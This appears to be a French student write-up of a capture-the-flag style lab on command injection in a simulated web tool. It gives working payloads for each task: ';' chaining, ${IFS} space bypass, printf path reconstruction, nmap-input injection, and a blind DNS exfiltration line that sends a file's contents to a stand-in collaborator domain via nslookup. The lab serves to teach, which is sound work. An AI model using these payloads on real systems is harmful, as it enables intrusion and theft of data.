# 🛡️ Web Application Security – Command Injection (0x09)

## 📌 Présentation

Ce projet explore les vulnérabilités de type **Command Injection** dans une application web simulant un outil de découverte d’actifs (Asset Discovery Tool).

L’objectif est d’identifier, exploiter et contourner différentes protections afin d’exécuter des commandes système et récupérer des flags.

---

# 🚀 Task 0 – Command Injection basique

## 🎯 Objectif

Récupérer :

```bash
/0-flag.txt
```

## 🔍 Analyse

La fonctionnalité `ping` exécute directement l’entrée utilisateur sans validation.

## 💥 Exploitation

Injection simple avec `;` :

```bash
google.com; cat /0-flag.txt
```

## 🧠 Vulnérabilité

* Absence de validation des entrées utilisateur
* Exécution directe de commandes système

## 🏁 Résultat

Flag récupéré avec succès

---

# 🚀 Task 1 – Bypass de filtres (espace et commandes)

## 🎯 Objectif

Récupérer :

```bash
/etc/1-flag.txt
```

## 🔍 Analyse

* Espaces bloqués
* Certaines commandes filtrées

## 💥 Exploitation

Utilisation de `${IFS}` pour remplacer l’espace :

```bash
google.com;cat${IFS}/etc/1-flag.txt
```

## 🧠 Vulnérabilité

* Filtrage insuffisant
* Contournement via variables d’environnement

## 🏁 Résultat

Flag récupéré

---

# 🚀 Task 2 – Contournement avancé (HOME + filtres stricts)

## 🎯 Objectif

Récupérer :

```bash
/var/2-flag.txt
```

## 🔍 Analyse

* `/` bloqué
* espaces bloqués
* certaines commandes interdites
* utilisation de `/bin/sh`

## 💥 Exploitation

Utilisation de variables et commandes pour reconstruire le chemin :

```bash
google.com;cat${IFS}$(printf${IFS}/var/2-flag.txt)
```

## 🧠 Vulnérabilité

* Mauvais filtrage
* Possibilité de reconstruire des chemins dynamiquement

## 🏁 Résultat

Flag récupéré

---

# 🚀 Task 3 – Blind Command Injection (exfiltration DNS)

## 🎯 Objectif

Récupérer :

```bash
/var/www/3-flag.txt
```

## 🔍 Analyse

* Aucun output affiché
* Injection possible mais aveugle

## 💥 Exploitation

Exfiltration via DNS avec `nslookup` :

```bash
google.com;nslookup $(cat /var/www/3-flag.txt).your-collaborator.net
```

## 🧠 Principe

* Le flag est envoyé dans une requête DNS
* Capturé via Burp Collaborator

## 🏁 Résultat

Flag récupéré via interaction DNS

---

# 🚀 Task 4 – Command Injection via Nmap

## 🎯 Objectif

Récupérer :

```bash
/bin/4-flag.txt
```

## 🔍 Analyse

L’entrée `nmap` est vulnérable à l’injection de commandes.

## 💥 Exploitation

Injection directe :

```bash
127.0.0.1; cat /bin/4-flag.txt
```

## 🧠 Vulnérabilité

* Mauvaise gestion des entrées utilisateur
* Exécution de commandes système via nmap

## 🏁 Résultat

Flag récupéré

---

# 🧠 Leçons importantes

* Ne jamais exécuter directement une entrée utilisateur
* Les filtres simples (blacklist) sont inefficaces
* Les variables d’environnement permettent des bypass
* L’absence de sortie ne signifie pas sécurité (blind injection)
* Les outils système (ping, nmap) peuvent devenir des vecteurs d’attaque

---

# 🔥 Compétences acquises

* Command Injection
* Bypass de filtres (IFS, variables)
* Reconstruction de chemins
* Blind injection
* Exfiltration DNS
* Exploitation d’outils système (ping, nmap)

---

# 🏁 Conclusion

Ce projet démontre comment une mauvaise gestion des entrées utilisateur peut compromettre totalement un système.
Même avec des protections, un attaquant peut contourner les filtres et exécuter des commandes arbitraires.

---

